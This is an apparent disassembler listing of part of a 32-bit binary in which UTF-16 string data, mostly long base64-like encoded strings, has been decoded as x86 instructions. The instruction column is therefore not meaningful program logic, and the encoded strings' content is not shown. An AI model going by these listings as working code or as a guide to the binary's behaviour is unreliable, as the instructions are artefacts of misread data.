1000367c:	00 70 00             	add    %dh,0x0(%eax)
1000367f:	4d                   	dec    %ebp
10003680:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
10003684:	00 52 00             	add    %dl,0x0(%edx)
10003687:	5a                   	pop    %edx
10003688:	00 31                	add    %dh,(%ecx)
1000368a:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
1000368e:	00 5a 00             	add    %bl,0x0(%edx)
10003691:	46                   	inc    %esi
10003692:	00 42 00             	add    %al,0x0(%edx)
10003695:	6b 00 56             	imul   $0x56,(%eax),%eax
10003698:	00 46 00             	add    %al,0x0(%esi)
1000369b:	42                   	inc    %edx
1000369c:	00 4a 00             	add    %cl,0x0(%edx)
1000369f:	61                   	popa
100036a0:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
100036a4:	00 58 00             	add    %bl,0x0(%eax)
100036a7:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
100036ab:	52                   	push   %edx
100036ac:	00 51 00             	add    %dl,0x0(%ecx)
100036af:	5a                   	pop    %edx
100036b0:	00 46 00             	add    %al,0x0(%esi)
100036b3:	52                   	push   %edx
100036b4:	00 51 00             	add    %dl,0x0(%ecx)
100036b7:	53                   	push   %ebx
100036b8:	00 57 00             	add    %dl,0x0(%edi)
100036bb:	6b 00 79             	imul   $0x79,(%eax),%eax
100036be:	00 59 00             	add    %bl,0x0(%ecx)
100036c1:	30 00                	xor    %al,(%eax)
100036c3:	68 00 4b 00 56       	push   $0x56004b00
100036c8:	00 33                	add    %dh,(%ebx)
100036ca:	00 56 00             	add    %dl,0x0(%esi)
100036cd:	6b 00 55             	imul   $0x55,(%eax),%eax
100036d0:	00 47 00             	add    %al,0x0(%edi)
100036d3:	52                   	push   %edx
100036d4:	00 55 00             	add    %dl,0x0(%ebp)
100036d7:	55                   	push   %ebp
100036d8:	00 45 00             	add    %al,0x0(%ebp)
100036db:	6c                   	insb   (%dx),%es:(%edi)
100036dc:	00 70 00             	add    %dh,0x0(%eax)
100036df:	4d                   	dec    %ebp
100036e0:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
100036e4:	00 31                	add    %dh,(%ecx)
100036e6:	00 5a 00             	add    %bl,0x0(%edx)
100036e9:	46                   	inc    %esi
100036ea:	00 42 00             	add    %al,0x0(%edx)
100036ed:	6b 00 56             	imul   $0x56,(%eax),%eax
100036f0:	00 46 00             	add    %al,0x0(%esi)
100036f3:	42                   	inc    %edx
100036f4:	00 4a 00             	add    %cl,0x0(%edx)
100036f7:	61                   	popa
100036f8:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
100036fc:	00 32                	add    %dh,(%edx)
100036fe:	00 57 00             	add    %dl,0x0(%edi)
10003701:	54                   	push   %esp
10003702:	00 4a 00             	add    %cl,0x0(%edx)
10003705:	58                   	pop    %eax
10003706:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
1000370a:	00 52 00             	add    %dl,0x0(%edx)
1000370d:	51                   	push   %ecx
1000370e:	00 5a 00             	add    %bl,0x0(%edx)
10003711:	46                   	inc    %esi
10003712:	00 52 00             	add    %dl,0x0(%edx)
10003715:	51                   	push   %ecx
10003716:	00 53 00             	add    %dl,0x0(%ebx)
10003719:	57                   	push   %edi
1000371a:	00 6b 00             	add    %ch,0x0(%ebx)
1000371d:	79 00                	jns    0x1000371f
1000371f:	56                   	push   %esi
10003720:	00 33                	add    %dh,(%ebx)
10003722:	00 56 00             	add    %dl,0x0(%esi)
10003725:	6b 00 55             	imul   $0x55,(%eax),%eax
10003728:	00 47 00             	add    %al,0x0(%edi)
1000372b:	52                   	push   %edx
1000372c:	00 55 00             	add    %dl,0x0(%ebp)
1000372f:	55                   	push   %ebp
10003730:	00 45 00             	add    %al,0x0(%ebp)
10003733:	6c                   	insb   (%dx),%es:(%edi)
10003734:	00 70 00             	add    %dh,0x0(%eax)
10003737:	4d                   	dec    %ebp
10003738:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
1000373c:	00 36                	add    %dh,(%esi)
1000373e:	00 59 00             	add    %bl,0x0(%ecx)
10003741:	31 00                	xor    %eax,(%eax)
10003743:	64 00 31             	add    %dh,%fs:(%ecx)
10003746:	00 5a 00             	add    %bl,0x0(%edx)
10003749:	46                   	inc    %esi
1000374a:	00 42 00             	add    %al,0x0(%edx)
1000374d:	6b 00 56             	imul   $0x56,(%eax),%eax
10003750:	00 46 00             	add    %al,0x0(%esi)
10003753:	42                   	inc    %edx
10003754:	00 4a 00             	add    %cl,0x0(%edx)
10003757:	61                   	popa
10003758:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
1000375c:	00 58 00             	add    %bl,0x0(%eax)
1000375f:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
10003763:	52                   	push   %edx
10003764:	00 51 00             	add    %dl,0x0(%ecx)
10003767:	5a                   	pop    %edx
10003768:	00 46 00             	add    %al,0x0(%esi)
1000376b:	52                   	push   %edx
1000376c:	00 51 00             	add    %dl,0x0(%ecx)
1000376f:	53                   	push   %ebx
10003770:	00 57 00             	add    %dl,0x0(%edi)
10003773:	6b 00 79             	imul   $0x79,(%eax),%eax
10003776:	00 64 00 7a          	add    %ah,0x7a(%eax,%eax,1)
1000377a:	00 30                	add    %dh,(%eax)
1000377c:	00 39                	add    %bh,(%ecx)
1000377e:	00 56 00             	add    %dl,0x0(%esi)
10003781:	33 00                	xor    (%eax),%eax
10003783:	56                   	push   %esi
10003784:	00 6b 00             	add    %ch,0x0(%ebx)
10003787:	55                   	push   %ebp
10003788:	00 47 00             	add    %al,0x0(%edi)
1000378b:	52                   	push   %edx
1000378c:	00 55 00             	add    %dl,0x0(%ebp)
1000378f:	55                   	push   %ebp
10003790:	00 45 00             	add    %al,0x0(%ebp)
10003793:	6c                   	insb   (%dx),%es:(%edi)
10003794:	00 70 00             	add    %dh,0x0(%eax)
10003797:	4d                   	dec    %ebp
10003798:	00 67 00             	add    %ah,0x0(%edi)
1000379b:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
100037a0:	15 57 00 75 00       	adc    $0x750057,%eax
100037a5:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
100037a9:	64 00 54 00 50       	add    %dl,%fs:0x50(%eax,%eax,1)
100037ae:	00 49 00             	add    %cl,0x0(%ecx)
100037b1:	69 00 32 00 00 01    	imul   $0x1000032,(%eax),%eax
100037b7:	00 85 81 51 00 6d    	add    %al,0x6d005181(%ebp)
100037bd:	00 55 00             	add    %dl,0x0(%ebp)
100037c0:	34 00                	xor    $0x0,%al
100037c2:	4e                   	dec    %esi
100037c3:	00 6a 00             	add    %ch,0x0(%edx)
100037c6:	68 00 78 00 4e       	push   $0x4e007800
100037cb:	00 6b 00             	add    %ch,0x0(%ebx)
100037ce:	70 00                	jo     0x100037d0
100037d0:	54                   	push   %esp
100037d1:	00 55 00             	add    %dl,0x0(%ebp)
100037d4:	31 00                	xor    %eax,(%eax)
100037d6:	4a                   	dec    %edx
100037d7:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
100037db:	00 6b 00             	add    %ch,0x0(%ebx)
100037de:	4a                   	dec    %edx
100037df:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
100037e3:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
100037e7:	00 34 00             	add    %dh,(%eax,%eax,1)
100037ea:	63 00                	arpl   %eax,(%eax)
100037ec:	54                   	push   %esp
100037ed:	00 5a 00             	add    %bl,0x0(%edx)
100037f0:	4b                   	dec    %ebx
100037f1:	00 55 00             	add    %dl,0x0(%ebp)
100037f4:	31 00                	xor    %eax,(%eax)
100037f6:	4e                   	dec    %esi
100037f7:	00 43 00             	add    %al,0x0(%ebx)
100037fa:	5a                   	pop    %edx
100037fb:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
100037ff:	00 32                	add    %dh,(%edx)
10003801:	00 4f 00             	add    %cl,0x0(%edi)
10003804:	48                   	dec    %eax
10003805:	00 45 00             	add    %al,0x0(%ebp)
10003808:	32 00                	xor    (%eax),%al
1000380a:	53                   	push   %ebx
1000380b:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
1000380f:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
10003813:	00 47 00             	add    %al,0x0(%edi)
10003816:	4a                   	dec    %edx
10003817:	00 48 00             	add    %cl,0x0(%eax)
1000381a:	51                   	push   %ecx
1000381b:	00 6d 00             	add    %ch,0x0(%ebp)
1000381e:	55                   	push   %ebp
1000381f:	00 34 00             	add    %dh,(%eax,%eax,1)
10003822:	4e                   	dec    %esi
10003823:	00 6a 00             	add    %ch,0x0(%edx)
10003826:	68 00 78 00 4e       	push   $0x4e007800
1000382b:	00 6b 00             	add    %ch,0x0(%ebx)
1000382e:	70 00                	jo     0x10003830
10003830:	54                   	push   %esp
10003831:	00 55 00             	add    %dl,0x0(%ebp)
10003834:	30 00                	xor    %al,(%eax)
10003836:	4a                   	dec    %edx
10003837:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
1000383b:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
1000383f:	00 34 00             	add    %dh,(%eax,%eax,1)
10003842:	63 00                	arpl   %eax,(%eax)
10003844:	54                   	push   %esp
10003845:	00 5a 00             	add    %bl,0x0(%edx)
10003848:	4b                   	dec    %ebx
10003849:	00 55 00             	add    %dl,0x0(%ebp)
1000384c:	31 00                	xor    %eax,(%eax)
1000384e:	4e                   	dec    %esi
1000384f:	00 57 00             	add    %dl,0x0(%edi)
10003852:	61                   	popa
10003853:	00 30                	add    %dh,(%eax)
10003855:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
10003859:	00 5a 00             	add    %bl,0x0(%edx)
1000385c:	54                   	push   %esp
1000385d:	00 67 00             	add    %ah,0x0(%edi)
10003860:	32 00                	xor    (%eax),%al
10003862:	4f                   	dec    %edi
10003863:	00 48 00             	add    %cl,0x0(%eax)
10003866:	45                   	inc    %ebp
10003867:	00 32                	add    %dh,(%edx)
10003869:	00 53 00             	add    %dl,0x0(%ebx)
1000386c:	6c                   	insb   (%dx),%es:(%edi)
1000386d:	00 4e 00             	add    %cl,0x0(%esi)
10003870:	54                   	push   %esp
10003871:	00 51 00             	add    %dl,0x0(%ecx)
10003874:	6d                   	insl   (%dx),%es:(%edi)
10003875:	00 55 00             	add    %dl,0x0(%ebp)
10003878:	34 00                	xor    $0x0,%al
1000387a:	4e                   	dec    %esi
1000387b:	00 6a 00             	add    %ch,0x0(%edx)
1000387e:	68 00 78 00 4e       	push   $0x4e007800
10003883:	00 6b 00             	add    %ch,0x0(%ebx)
10003886:	70 00                	jo     0x10003888
10003888:	54                   	push   %esp
10003889:	00 55 00             	add    %dl,0x0(%ebp)
1000388c:	30 00                	xor    %al,(%eax)
1000388e:	68 00 53 00 64       	push   $0x64005300
10003893:	00 6b 00             	add    %ch,0x0(%ebx)
10003896:	4a                   	dec    %edx
10003897:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
1000389b:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
1000389f:	00 34 00             	add    %dh,(%eax,%eax,1)
100038a2:	63 00                	arpl   %eax,(%eax)
100038a4:	54                   	push   %esp
100038a5:	00 5a 00             	add    %bl,0x0(%edx)
100038a8:	4b                   	dec    %ebx
100038a9:	00 55 00             	add    %dl,0x0(%ebp)
100038ac:	31 00                	xor    %eax,(%eax)
100038ae:	4e                   	dec    %esi
100038af:	00 43 00             	add    %al,0x0(%ebx)
100038b2:	5a                   	pop    %edx
100038b3:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
100038b7:	00 32                	add    %dh,(%edx)
100038b9:	00 4f 00             	add    %cl,0x0(%edi)
100038bc:	48                   	dec    %eax
100038bd:	00 45 00             	add    %al,0x0(%ebp)
100038c0:	32 00                	xor    (%eax),%al
100038c2:	53                   	push   %ebx
100038c3:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
100038c7:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
100038cb:	00 55 00             	add    %dl,0x0(%ebp)
100038ce:	68 00 6b 00 51       	push   $0x51006b00
100038d3:	00 6d 00             	add    %ch,0x0(%ebp)
100038d6:	55                   	push   %ebp
100038d7:	00 34 00             	add    %dh,(%eax,%eax,1)
100038da:	4e                   	dec    %esi
100038db:	00 6a 00             	add    %ch,0x0(%edx)
100038de:	68 00 78 00 4e       	push   $0x4e007800
100038e3:	00 6b 00             	add    %ch,0x0(%ebx)
100038e6:	70 00                	jo     0x100038e8
100038e8:	54                   	push   %esp
100038e9:	00 55 00             	add    %dl,0x0(%ebp)
100038ec:	30 00                	xor    %al,(%eax)
100038ee:	4a                   	dec    %edx
100038ef:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
100038f3:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
100038f7:	00 34 00             	add    %dh,(%eax,%eax,1)
100038fa:	63 00                	arpl   %eax,(%eax)
100038fc:	54                   	push   %esp
100038fd:	00 5a 00             	add    %bl,0x0(%edx)
10003900:	4b                   	dec    %ebx
10003901:	00 55 00             	add    %dl,0x0(%ebp)
10003904:	31 00                	xor    %eax,(%eax)
10003906:	4e                   	dec    %esi
10003907:	00 35 00 59 00 56    	add    %dh,0x56005900
1000390d:	00 68 00             	add    %ch,0x0(%eax)
10003910:	43                   	inc    %ebx
10003911:	00 5a 00             	add    %bl,0x0(%edx)
10003914:	54                   	push   %esp
10003915:	00 67 00             	add    %ah,0x0(%edi)
10003918:	32 00                	xor    (%eax),%al
1000391a:	4f                   	dec    %edi
1000391b:	00 48 00             	add    %cl,0x0(%eax)
1000391e:	45                   	inc    %ebp
1000391f:	00 32                	add    %dh,(%edx)
10003921:	00 53 00             	add    %dl,0x0(%ebx)
10003924:	6c                   	insb   (%dx),%es:(%edi)
10003925:	00 4e 00             	add    %cl,0x0(%esi)
10003928:	54                   	push   %esp
10003929:	00 51 00             	add    %dl,0x0(%ecx)
1000392c:	6d                   	insl   (%dx),%es:(%edi)
1000392d:	00 55 00             	add    %dl,0x0(%ebp)
10003930:	34 00                	xor    $0x0,%al
10003932:	4e                   	dec    %esi
10003933:	00 6a 00             	add    %ch,0x0(%edx)
10003936:	68 00 78 00 4e       	push   $0x4e007800
1000393b:	00 6b 00             	add    %ch,0x0(%ebx)
1000393e:	70 00                	jo     0x10003940
10003940:	54                   	push   %esp
10003941:	00 55 00             	add    %dl,0x0(%ebp)
10003944:	31 00                	xor    %eax,(%eax)
10003946:	4a                   	dec    %edx
10003947:	00 73 00             	add    %dh,0x0(%ebx)
1000394a:	53                   	push   %ebx
1000394b:	00 55 00             	add    %dl,0x0(%ebp)
1000394e:	4a                   	dec    %edx
1000394f:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
10003953:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
10003957:	00 34 00             	add    %dh,(%eax,%eax,1)
1000395a:	63 00                	arpl   %eax,(%eax)
1000395c:	54                   	push   %esp
1000395d:	00 5a 00             	add    %bl,0x0(%edx)
10003960:	4b                   	dec    %ebx
10003961:	00 55 00             	add    %dl,0x0(%ebp)
10003964:	31 00                	xor    %eax,(%eax)
10003966:	4e                   	dec    %esi
10003967:	00 43 00             	add    %al,0x0(%ebx)
1000396a:	5a                   	pop    %edx
1000396b:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
1000396f:	00 32                	add    %dh,(%edx)
10003971:	00 4f 00             	add    %cl,0x0(%edi)
10003974:	48                   	dec    %eax
10003975:	00 45 00             	add    %al,0x0(%ebp)
10003978:	32 00                	xor    (%eax),%al
1000397a:	53                   	push   %ebx
1000397b:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
1000397f:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
10003983:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
10003987:	00 56 00             	add    %dl,0x0(%esi)
1000398a:	51                   	push   %ecx
1000398b:	00 6d 00             	add    %ch,0x0(%ebp)
1000398e:	55                   	push   %ebp
1000398f:	00 34 00             	add    %dh,(%eax,%eax,1)
10003992:	4e                   	dec    %esi
10003993:	00 6a 00             	add    %ch,0x0(%edx)
10003996:	68 00 78 00 4e       	push   $0x4e007800
1000399b:	00 6b 00             	add    %ch,0x0(%ebx)
1000399e:	70 00                	jo     0x100039a0
100039a0:	54                   	push   %esp
100039a1:	00 55 00             	add    %dl,0x0(%ebp)
100039a4:	30 00                	xor    %al,(%eax)
100039a6:	4a                   	dec    %edx
100039a7:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
100039ab:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
100039af:	00 34 00             	add    %dh,(%eax,%eax,1)
100039b2:	63 00                	arpl   %eax,(%eax)
100039b4:	54                   	push   %esp
100039b5:	00 5a 00             	add    %bl,0x0(%edx)
100039b8:	4b                   	dec    %ebx
100039b9:	00 55 00             	add    %dl,0x0(%ebp)
100039bc:	31 00                	xor    %eax,(%eax)
100039be:	4e                   	dec    %esi
100039bf:	00 53 00             	add    %dl,0x0(%ebx)
100039c2:	4d                   	dec    %ebp
100039c3:	00 30                	add    %dh,(%eax)
100039c5:	00 70 00             	add    %dh,0x0(%eax)
100039c8:	43                   	inc    %ebx
100039c9:	00 5a 00             	add    %bl,0x0(%edx)
100039cc:	54                   	push   %esp
100039cd:	00 67 00             	add    %ah,0x0(%edi)
100039d0:	32 00                	xor    (%eax),%al
100039d2:	4f                   	dec    %edi
100039d3:	00 48 00             	add    %cl,0x0(%eax)
100039d6:	45                   	inc    %ebp
100039d7:	00 32                	add    %dh,(%edx)
100039d9:	00 53 00             	add    %dl,0x0(%ebx)
100039dc:	6c                   	insb   (%dx),%es:(%edi)
100039dd:	00 4e 00             	add    %cl,0x0(%esi)
100039e0:	54                   	push   %esp
100039e1:	00 51 00             	add    %dl,0x0(%ecx)
100039e4:	6d                   	insl   (%dx),%es:(%edi)
100039e5:	00 55 00             	add    %dl,0x0(%ebp)
100039e8:	34 00                	xor    $0x0,%al
100039ea:	4e                   	dec    %esi
100039eb:	00 6a 00             	add    %ch,0x0(%edx)
100039ee:	68 00 78 00 4e       	push   $0x4e007800
100039f3:	00 6b 00             	add    %ch,0x0(%ebx)
100039f6:	70 00                	jo     0x100039f8
100039f8:	54                   	push   %esp
100039f9:	00 55 00             	add    %dl,0x0(%ebp)
100039fc:	32 00                	xor    (%eax),%al
100039fe:	70 00                	jo     0x10003a00
10003a00:	69 00 56 00 30 00    	imul   $0x300056,(%eax),%eax
10003a06:	4a                   	dec    %edx
10003a07:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
10003a0b:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
10003a0f:	00 34 00             	add    %dh,(%eax,%eax,1)
10003a12:	63 00                	arpl   %eax,(%eax)
10003a14:	54                   	push   %esp
10003a15:	00 5a 00             	add    %bl,0x0(%edx)
10003a18:	4b                   	dec    %ebx
10003a19:	00 55 00             	add    %dl,0x0(%ebp)
10003a1c:	31 00                	xor    %eax,(%eax)
10003a1e:	4e                   	dec    %esi
10003a1f:	00 43 00             	add    %al,0x0(%ebx)
10003a22:	5a                   	pop    %edx
10003a23:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
10003a27:	00 32                	add    %dh,(%edx)
10003a29:	00 4f 00             	add    %cl,0x0(%edi)
10003a2c:	48                   	dec    %eax
10003a2d:	00 45 00             	add    %al,0x0(%ebp)
10003a30:	32 00                	xor    (%eax),%al
10003a32:	53                   	push   %ebx
10003a33:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
10003a37:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
10003a3b:	00 45 00             	add    %al,0x0(%ebp)
10003a3e:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
10003a42:	51                   	push   %ecx
10003a43:	00 6d 00             	add    %ch,0x0(%ebp)
10003a46:	55                   	push   %ebp
10003a47:	00 34 00             	add    %dh,(%eax,%eax,1)
10003a4a:	4e                   	dec    %esi
10003a4b:	00 6a 00             	add    %ch,0x0(%edx)
10003a4e:	68 00 78 00 4e       	push   $0x4e007800
10003a53:	00 6b 00             	add    %ch,0x0(%ebx)
10003a56:	70 00                	jo     0x10003a58
10003a58:	54                   	push   %esp
10003a59:	00 55 00             	add    %dl,0x0(%ebp)
10003a5c:	30 00                	xor    %al,(%eax)
10003a5e:	4a                   	dec    %edx
10003a5f:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
10003a63:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
10003a67:	00 34 00             	add    %dh,(%eax,%eax,1)
10003a6a:	63 00                	arpl   %eax,(%eax)
10003a6c:	54                   	push   %esp
10003a6d:	00 5a 00             	add    %bl,0x0(%edx)
10003a70:	4b                   	dec    %ebx
10003a71:	00 55 00             	add    %dl,0x0(%ebp)
10003a74:	31 00                	xor    %eax,(%eax)
10003a76:	4e                   	dec    %esi
10003a77:	00 71 00             	add    %dh,0x0(%ecx)
10003a7a:	57                   	push   %edi
10003a7b:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003a7f:	00 43 00             	add    %al,0x0(%ebx)
10003a82:	5a                   	pop    %edx
10003a83:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
10003a87:	00 32                	add    %dh,(%edx)
10003a89:	00 4f 00             	add    %cl,0x0(%edi)
10003a8c:	48                   	dec    %eax
10003a8d:	00 45 00             	add    %al,0x0(%ebp)
10003a90:	32 00                	xor    (%eax),%al
10003a92:	53                   	push   %ebx
10003a93:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
10003a97:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
10003a9b:	00 6d 00             	add    %ch,0x0(%ebp)
10003a9e:	55                   	push   %ebp
10003a9f:	00 34 00             	add    %dh,(%eax,%eax,1)
10003aa2:	4e                   	dec    %esi
10003aa3:	00 6a 00             	add    %ch,0x0(%edx)
10003aa6:	68 00 78 00 4e       	push   $0x4e007800
10003aab:	00 6b 00             	add    %ch,0x0(%ebx)
10003aae:	70 00                	jo     0x10003ab0
10003ab0:	54                   	push   %esp
10003ab1:	00 55 00             	add    %dl,0x0(%ebp)
10003ab4:	31 00                	xor    %eax,(%eax)
10003ab6:	45                   	inc    %ebp
10003ab7:	00 7a 00             	add    %bh,0x0(%edx)
10003aba:	54                   	push   %esp
10003abb:	00 6b 00             	add    %ch,0x0(%ebx)
10003abe:	4a                   	dec    %edx
10003abf:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
10003ac3:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
10003ac7:	00 34 00             	add    %dh,(%eax,%eax,1)
10003aca:	63 00                	arpl   %eax,(%eax)
10003acc:	54                   	push   %esp
10003acd:	00 5a 00             	add    %bl,0x0(%edx)
10003ad0:	4b                   	dec    %ebx
10003ad1:	00 55 00             	add    %dl,0x0(%ebp)
10003ad4:	31 00                	xor    %eax,(%eax)
10003ad6:	4e                   	dec    %esi
10003ad7:	00 43 00             	add    %al,0x0(%ebx)
10003ada:	5a                   	pop    %edx
10003adb:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
10003adf:	00 32                	add    %dh,(%edx)
10003ae1:	00 4f 00             	add    %cl,0x0(%edi)
10003ae4:	48                   	dec    %eax
10003ae5:	00 45 00             	add    %al,0x0(%ebp)
10003ae8:	32 00                	xor    (%eax),%al
10003aea:	53                   	push   %ebx
10003aeb:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
10003aef:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
10003af3:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
10003af7:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
10003afb:	00 6d 00             	add    %ch,0x0(%ebp)
10003afe:	55                   	push   %ebp
10003aff:	00 34 00             	add    %dh,(%eax,%eax,1)
10003b02:	4e                   	dec    %esi
10003b03:	00 6a 00             	add    %ch,0x0(%edx)
10003b06:	68 00 78 00 4e       	push   $0x4e007800
10003b0b:	00 6b 00             	add    %ch,0x0(%ebx)
10003b0e:	70 00                	jo     0x10003b10
10003b10:	54                   	push   %esp
10003b11:	00 55 00             	add    %dl,0x0(%ebp)
10003b14:	30 00                	xor    %al,(%eax)
10003b16:	4a                   	dec    %edx
10003b17:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
10003b1b:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
10003b1f:	00 34 00             	add    %dh,(%eax,%eax,1)
10003b22:	63 00                	arpl   %eax,(%eax)
10003b24:	54                   	push   %esp
10003b25:	00 5a 00             	add    %bl,0x0(%edx)
10003b28:	4b                   	dec    %ebx
10003b29:	00 55 00             	add    %dl,0x0(%ebp)
10003b2c:	31 00                	xor    %eax,(%eax)
10003b2e:	4e                   	dec    %esi
10003b2f:	00 4f 00             	add    %cl,0x0(%edi)
10003b32:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
10003b36:	6c                   	insb   (%dx),%es:(%edi)
10003b37:	00 43 00             	add    %al,0x0(%ebx)
10003b3a:	5a                   	pop    %edx
10003b3b:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
10003b3f:	00 32                	add    %dh,(%edx)
10003b41:	00 4f 00             	add    %cl,0x0(%edi)
10003b44:	48                   	dec    %eax
10003b45:	00 45 00             	add    %al,0x0(%ebp)
10003b48:	32 00                	xor    (%eax),%al
10003b4a:	53                   	push   %ebx
10003b4b:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
10003b4f:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
10003b53:	00 6d 00             	add    %ch,0x0(%ebp)
10003b56:	55                   	push   %ebp
10003b57:	00 34 00             	add    %dh,(%eax,%eax,1)
10003b5a:	4e                   	dec    %esi
10003b5b:	00 6a 00             	add    %ch,0x0(%edx)
10003b5e:	68 00 78 00 4e       	push   $0x4e007800
10003b63:	00 6b 00             	add    %ch,0x0(%ebx)
10003b66:	70 00                	jo     0x10003b68
10003b68:	54                   	push   %esp
10003b69:	00 55 00             	add    %dl,0x0(%ebp)
10003b6c:	30 00                	xor    %al,(%eax)
10003b6e:	68 00 53 00 64       	push   $0x64005300
10003b73:	00 6b 00             	add    %ch,0x0(%ebx)
10003b76:	4a                   	dec    %edx
10003b77:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
10003b7b:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
10003b7f:	00 34 00             	add    %dh,(%eax,%eax,1)
10003b82:	63 00                	arpl   %eax,(%eax)
10003b84:	54                   	push   %esp
10003b85:	00 5a 00             	add    %bl,0x0(%edx)
10003b88:	4b                   	dec    %ebx
10003b89:	00 55 00             	add    %dl,0x0(%ebp)
10003b8c:	31 00                	xor    %eax,(%eax)
10003b8e:	4e                   	dec    %esi
10003b8f:	00 43 00             	add    %al,0x0(%ebx)
10003b92:	5a                   	pop    %edx
10003b93:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
10003b97:	00 32                	add    %dh,(%edx)
10003b99:	00 4f 00             	add    %cl,0x0(%edi)
10003b9c:	48                   	dec    %eax
10003b9d:	00 45 00             	add    %al,0x0(%ebp)
10003ba0:	32 00                	xor    (%eax),%al
10003ba2:	53                   	push   %ebx
10003ba3:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
10003ba7:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
10003bab:	00 55 00             	add    %dl,0x0(%ebp)
10003bae:	68 00 43 00 51       	push   $0x51004300
10003bb3:	00 6d 00             	add    %ch,0x0(%ebp)
10003bb6:	55                   	push   %ebp
10003bb7:	00 34 00             	add    %dh,(%eax,%eax,1)
10003bba:	4e                   	dec    %esi
10003bbb:	00 6a 00             	add    %ch,0x0(%edx)
10003bbe:	68 00 78 00 4e       	push   $0x4e007800
10003bc3:	00 6b 00             	add    %ch,0x0(%ebx)
10003bc6:	70 00                	jo     0x10003bc8
10003bc8:	54                   	push   %esp
10003bc9:	00 55 00             	add    %dl,0x0(%ebp)
10003bcc:	30 00                	xor    %al,(%eax)
10003bce:	4a                   	dec    %edx
10003bcf:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
10003bd3:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
10003bd7:	00 34 00             	add    %dh,(%eax,%eax,1)
10003bda:	63 00                	arpl   %eax,(%eax)
10003bdc:	54                   	push   %esp
10003bdd:	00 5a 00             	add    %bl,0x0(%edx)
10003be0:	4b                   	dec    %ebx
10003be1:	00 55 00             	add    %dl,0x0(%ebp)
10003be4:	31 00                	xor    %eax,(%eax)
10003be6:	4e                   	dec    %esi
10003be7:	00 35 00 59 00 6a    	add    %dh,0x6a005900
10003bed:	00 4a 00             	add    %cl,0x0(%edx)
10003bf0:	43                   	inc    %ebx
10003bf1:	00 5a 00             	add    %bl,0x0(%edx)
10003bf4:	54                   	push   %esp
10003bf5:	00 67 00             	add    %ah,0x0(%edi)
10003bf8:	32 00                	xor    (%eax),%al
10003bfa:	4f                   	dec    %edi
10003bfb:	00 48 00             	add    %cl,0x0(%eax)
10003bfe:	45                   	inc    %ebp
10003bff:	00 32                	add    %dh,(%edx)
10003c01:	00 53 00             	add    %dl,0x0(%ebx)
10003c04:	6c                   	insb   (%dx),%es:(%edi)
10003c05:	00 4e 00             	add    %cl,0x0(%esi)
10003c08:	54                   	push   %esp
10003c09:	00 51 00             	add    %dl,0x0(%ecx)
10003c0c:	6d                   	insl   (%dx),%es:(%edi)
10003c0d:	00 55 00             	add    %dl,0x0(%ebp)
